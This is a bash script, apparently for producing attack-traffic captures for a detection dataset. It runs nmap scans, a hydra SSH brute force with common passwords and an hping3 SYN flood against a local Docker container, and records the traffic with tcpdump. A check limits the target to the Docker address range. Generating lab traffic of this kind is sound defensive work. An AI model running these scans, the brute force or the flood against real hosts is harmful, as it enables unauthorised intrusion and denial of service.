#!/bin/bash
# LAB ONLY: attacks the local Docker container below and nothing else.
TARGET=172.17.0.3
case "$TARGET" in 172.17.*) ;; *) echo "Target not in Docker range, aborting"; exit 1;; esac

trap 'kill $TCPDUMP_PID 2>/dev/null' EXIT
rm -f data/raw/attack.pcap
tcpdump -i docker0 -w data/raw/attack.pcap "host $TARGET" 2>/dev/null &
TCPDUMP_PID=$!
sleep 2

echo "[1/5] SYN scan";       timeout 90 nmap -sS -p 1-10000 -T4 $TARGET > /dev/null
echo "[2/5] Version scan";   timeout 60 nmap -sV -p 22 -T4 $TARGET > /dev/null
echo "[3/5] Connect scan";   timeout 60 nmap -sT -p 1-1000 $TARGET > /dev/null
echo "[4/5] SSH brute force"
printf "root\nadmin\ntest\n123456\npassword\nletmein\nqwerty\ntoor\n" > /tmp/pw.txt
timeout 60 hydra -l root -P /tmp/pw.txt -t 4 ssh://$TARGET > /dev/null 2>&1
echo "[5/5] SYN flood burst"; timeout 20 hping3 -S -p 22 -i u1000 -c 15000 $TARGET > /dev/null 2>&1

sleep 2
echo "Done."
